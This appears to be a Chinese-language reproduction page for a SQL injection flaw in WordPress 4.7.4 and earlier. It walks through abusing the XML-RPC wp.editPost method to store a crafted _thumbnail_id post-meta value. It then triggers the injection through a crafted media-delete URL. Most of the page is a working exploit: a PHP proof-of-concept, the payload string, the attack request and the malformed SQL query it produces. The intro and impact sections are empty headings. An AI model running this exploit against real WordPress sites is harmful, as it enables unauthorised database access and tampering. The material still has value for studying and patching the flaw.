# Wordpress <= 4.7.4 XML-RPC API POST META 未校验漏洞

### 一、漏洞简介

### 二、漏洞影响

### 三、复现过程

中文版

以作者身份登录到您的wordpress

上传图片

记住图像/媒体的ID

创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元）

记住帖子ID

我们可以通过修改_thumbnail_id的值来编辑的值（6是帖子ID，5是图片/帖子ID）

poc


```php
$usr = 'author';
$pwd = 'author';
$xmlrpc = 'http://local.target/xmlrpc.php';
$client = new IXR_Client($xmlrpc);
$content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"xxx"));
$res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);
```

通过这段代码，我们在数据库中添加以下负载


```bash
5 %1$%s hello
```

执行SQL负载

使用作者帐户登录管理面板，转到媒体，例如


```bash
http://url/wp-admin/upload.php
```

通过_wpnonce参数可以直接进行sql注入


```bash
http://url/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello
```

其中5 %1$%s hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误）


```sql
SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello'
```

这证明了Wordpress中的sql漏洞，正如5%1$%s之后的前一个post值中提到的，hello就是我们的payload

